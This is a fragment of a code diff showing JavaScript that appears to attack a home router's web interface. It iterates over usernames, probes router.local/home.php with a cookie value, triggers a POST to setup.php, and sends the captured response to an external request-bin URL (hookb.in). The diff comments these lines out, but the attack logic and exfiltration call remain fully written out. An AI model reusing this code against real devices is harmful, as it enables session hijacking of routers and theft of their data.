@@ -25,31 +25,31 @@ for (u in unames) {
             xhr.send(JSON.stringify(http.responseURL));
         };
 
-        http.onreadystatechange = function () {
-            if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
-                if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
-                    let req = new XMLHttpRequest();
-                    req.open('POST', 'http://router.local/setup.php', true);
-                    req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    req.onload = function () {
-                        let r = new XMLHttpRequest();
-                        r.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
-                        r.setRequestHeader('Content-type', 'application/json');
-                        r.send(JSON.stringify(http.responseText));
-                    };
-                    req.send();
-                    breakCheck = true;
-                }
-            }
-        };
+//         http.onreadystatechange = function () {
+//             if (http.readyState === XMLHttpRequest.DONE && http.status === 200) {
+//                 if (http.responseURL === 'http://router.local/home.php?action=view&' + cook) {
+//                     let req = new XMLHttpRequest();
+//                     req.open('POST', 'http://router.local/setup.php', true);
+//                     req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+//                     req.onload = function () {
+//                         let r = new XMLHttpRequest();
+//                         r.open('POST', 'https://hookb.in/1gdxlYb2j6sd6NOOxnDq', true);
+//                         r.setRequestHeader('Content-type', 'application/json');
+//                         r.send(JSON.stringify(http.responseText));
+//                     };
+//                     req.send();
+//                     breakCheck = true;
+//                 }
+//             }
+//         };
         http.send(url);
-        if (breakCheck) {
-            break;
-        }
+//         if (breakCheck) {
+//             break;
+//         }
     }
-    if (breakCheck) {
-        break;
-    }
+//     if (breakCheck) {
+//         break;
+//     }
 }
 
 
